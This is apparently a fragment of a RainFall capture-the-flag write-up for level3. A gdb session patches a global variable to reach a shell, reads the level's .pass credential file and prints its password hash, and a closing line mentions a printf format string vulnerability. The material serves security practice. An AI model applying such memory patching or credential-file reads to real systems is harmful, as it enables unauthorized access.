level3@RainFall:~$ gdb ./level3 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) b v
Breakpoint 1 at 0x80484ad
(gdb) r
Starting program: /home/user/level3/level3 

Breakpoint 1, 0x080484ad in v ()
(gdb) set *(int*)0x804988c = 0x40
(gdb) continue
Continuing.
lo
lo
Wait what?!
$ cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

Then it calls printf() directly with the user input as the format string — this introduces a format string vulnerability.